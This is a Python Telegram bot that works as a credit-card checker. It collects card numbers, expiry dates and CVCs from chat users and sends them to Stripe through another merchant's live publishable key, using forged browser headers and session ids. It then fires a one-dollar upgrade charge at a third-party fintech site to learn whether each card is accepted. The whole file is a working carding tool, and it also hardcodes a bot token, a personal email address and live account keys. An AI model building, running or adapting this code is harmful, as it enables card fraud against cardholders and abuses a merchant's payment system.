import telebot
import requests
import time
import random
import string

# Replace with your bot token
API_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(API_TOKEN)

# When /start is received
@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "Send your credit card details in one message in this format:\n"
        "`CARD_NUMBER,MM,YY,CVC`\n"
        "Example: 4147098797621083,10,28,202",
        parse_mode='Markdown'
    )

# When user sends card details
@bot.message_handler(func=lambda message: True)
def handle_card_input(message):
    chat_id = message.chat.id
    text = message.text.strip()

    # Parse input
    parts = [p.strip() for p in text.split(',')]
    if len(parts) != 4:
        bot.send_message(chat_id, "Invalid format. Please send as: CARD_NUMBER,MM,YY,CVC")
        return

    card_number, exp_month, exp_year, cvc = parts
    email = "peshangsalam2001@gmail.com"  # fixed email

    # Step 1: Create Stripe payment method
    response_json = create_stripe_payment_method(card_number, cvc, exp_month, exp_year, email)

    # Check for error in Stripe response
    if 'error' in response_json:
        # Card declined
        error_msg = response_json['error'].get('message', 'Card declined or error.')
        bot.send_message(chat_id, f"Your card was declined.\nReason: {error_msg}")
        return

    payment_method_id = response_json.get('id', '')
    if not payment_method_id.startswith('pm_'):
        bot.send_message(chat_id, "Failed to create payment method.")
        return

    # Step 2: Send payment method ID to your website and get response
    website_response = send_to_your_website(payment_method_id)

    # Send the raw response from your website back to user
    # (assuming the response is a JSON or text that indicates success/decline)
    if 'status":"success' in website_response:
        bot.send_message(chat_id, "✅ Payment succeeded!\nYour card was accepted.")
    elif 'status":"error' in website_response or 'declined' in website_response:
        bot.send_message(chat_id, f"❌ Payment declined or failed:\n{website_response}")
    else:
        bot.send_message(chat_id, f"Received response:\n{website_response}")

def create_stripe_payment_method(card_number, cvc, exp_month, exp_year, email):
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "Host": "api.stripe.com",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": "same-site",
        "origin": "https://js.stripe.com",
        "sec-fetch-mode": "cors",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15"
    }
    data = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[address][postal_code]": "10080",
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "3b6715c7-7d06-4767-9d0e-667a77f622e5a12342",
        "muid": "12306c10-3547-45cd-8fc4-4b959422e6d6cbbfdc",
        "sid": "ff3a4f20-d7cf-4cda-b1b3-4ef195a30495abe988",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/cc3c01f5f2; stripe-js-v3/cc3c01f5f2; card-element",
        "referrer": "https://www.example.com/",
        "time_on_page": "36472",
        "key": "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL",
        "_stripe_account": "acct_1R0HtXGadsrUZ7KN"
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def send_to_your_website(payment_method_id):
    url = "https://www.popularfintech.com/upgrade?_data=routes%2Fupgrade"
    headers = {
        "Host": "www.popularfintech.com",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "referer": "https://www.popularfintech.com/",
        "sentry-trace": "2e94dc9fdbbe4a97b6685e2573f16a89",
        # Add cookies if needed
        # "cookie": "..."
    }
    data = {
        "email": "peshangsalam2001@gmail.com",
        "force_three_d_secure": "false",
        "price_id": "44e86c12-5845-42bb-b2e9-e278e352f206",
        "payment_method": payment_method_id,
        "amount_cents": "100",
        "upgrade_error_message": "Oops%2C+something+went+wrong.",
        "upgrade_success_message": "You+are+now+a+premium+subscriber"
    }
    response = requests.post(url, headers=headers, data=data)
    return response.text

# Run the bot
bot.polling()